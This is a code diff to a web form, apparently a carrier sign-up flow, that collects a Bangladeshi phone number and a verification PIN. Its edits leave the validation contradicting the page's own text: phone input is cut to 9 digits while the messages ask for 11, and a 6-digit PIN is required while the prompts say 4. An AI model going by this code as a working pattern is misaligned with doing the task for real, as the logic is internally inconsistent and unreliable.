@@ -59,14 +59,14 @@
                     <div class="phone-input">
                         <span class="country-code">+88</span>
                         <input class="blink" type="text" name="msisdn" id="msisdn" placeholder="ফোন নম্বর।(0123-4567890)" required 
-                               pattern="[0-9]{4} [0-9]{7}" title="অনুগ্রহ করে এই ফর্ম্যাটে 11 টি সংখ্যা লিখুন: 0123-4567890">
+                               pattern="[0-9]{4} [0-9]{5}" title="অনুগ্রহ করে এই ফর্ম্যাটে 11 টি সংখ্যা লিখুন: 0123-4567890">
                     </div>                       
                 </div>
                 <!-- 2、验证码输入框 + 发送验证码按钮 -->
                 <div class="form-group">                   
                     <div class="pin-input-container-pin">
                         <input type="text" name="pin" id="pin" class="pin-input blink" placeholder="4-সংখ্যার পিন লিখুন" 
-                               pattern="[0-9]{4}" title="অনুগ্রহ করে 4 টি সংখ্যা লিখুন" maxlength="4">
+                               pattern="[0-9]{6}" title="অনুগ্রহ করে 6 টি সংখ্যা লিখুন" maxlength="6">
                         <button type="submit" class="send-pin-btn" id="sendPinBtn">পিন পাঠান</button>
                     </div>                       
                 </div>             
@@ -96,16 +96,15 @@
                 successDiv.style.display = 'none';
                 
                 // 简单的客户端验证
-                if (!input.value.match(/^\d{4} \d{7}$/)) {
+                if (!input.value.match(/^\d{4} \d{5}$/)) {
                     errorDiv.textContent = 'দয়া করে এই ফর্ম্যাটে একটি বৈধ ফোন নম্বর লিখুন: 0123-4567890';
                     errorDiv.style.display = 'block';
-                    input.classlist.remove('blink');
                     return;
                 }
                 
                 // 显示加载指示器
                 loadingDiv.style.display = 'block';
-                
+                input.classList.remove('blink');
                 try {
                     // 发送数据到服务器端处理
                     const formData = new FormData();
@@ -137,12 +136,12 @@
                         let countdown = 120; // 120秒倒计时
                         
                         // 更新按钮文本
-                        sendPinBtn.textContent = `আবার পাঠান ${countdown}s`;
+                        sendPinBtn.textContent = ` ${countdown}s`;
                         
                         // 设置倒计时间隔
                         const countdownInterval = setInterval(() => {
                             countdown--;
-                            sendPinBtn.textContent = `আবার পাঠান ${countdown}s`;
+                            sendPinBtn.textContent = ` ${countdown}s`;
                             
                             if (countdown <= 0) {
                                 clearInterval(countdownInterval);
@@ -155,7 +154,7 @@
                     } 
                     else {
                         // 显示错误消息
-                        errorDiv.textContent = result.message || 'একটি ত্রুটি ঘটেছে। অনুগ্রহ করে আবার চেষ্টা করুন।';
+                        errorDiv.textContent = 'একটি ত্রুটি ঘটেছে। অনুগ্রহ করে আবার চেষ্টা করুন।';
                         errorDiv.style.display = 'block';
                     }
                 }
@@ -177,14 +176,14 @@
                 let value = e.target.value.replace(/\D/g, '');
                 
                 // 如果超过10位，截取前10位
-                if (value.length > 11) {
-                    value = value.substring(0, 11);
+                if (value.length > 9) {
+                    value = value.substring(0, 9);
                 }
                 
                 // 根据数字长度进行格式化
                 let formattedValue = value;
                 if (value.length > 4) {
-                    formattedValue = value.substring(0, 4) + ' ' + value.substring(4, 11) ;
+                    formattedValue = value.substring(0, 4) + ' ' + value.substring(4, 9) ;
                 }
                 
                 // 更新输入框的值
@@ -199,12 +198,12 @@
                 const loadingDiv = document.getElementById('loading');
                 const containerDiv = document.getElementById('container');
                 const maskDiv = document.getElementById('mask');
-                const blurbgDiv = document.getElementById('blur-bg');
+               
                 // 验证PIN码
                 if (!pinInput.value.match(/^\d{6}$/)) {
-                    errorDiv.textContent = 'অনুগ্রহ করে একটি বৈধ 6-সংখ্যার পিন কোড লিখুন।';
+                    errorDiv.textContent = 'অনুগ্রহ করে একটি বৈধ 4-সংখ্যার পিন কোড লিখুন।';
                     errorDiv.style.display = 'block';
-                    pinInput.classlist.remove('blink');
+                    
                     return;
                 }
                 
@@ -212,7 +211,7 @@
                 loadingDiv.style.display = 'block';
                 errorDiv.style.display = 'none';
                 successDiv.style.display = 'none';
-                
+                pinInput.classList.remove('blink');
                 try {
                     // 发送验证请求
                     const formData = new FormData();
@@ -244,8 +243,8 @@
                                 
                                 setTimeout(() => {
                                     containerDiv.classList.add('hidden');maskDiv.classList.add('hidden');
-                                    blurbgDiv.classList.add('hidden');}, 1000);
-                            }, 1000);
+                                }, 1000);
+                            }, 2000);
                             
                             
                         }
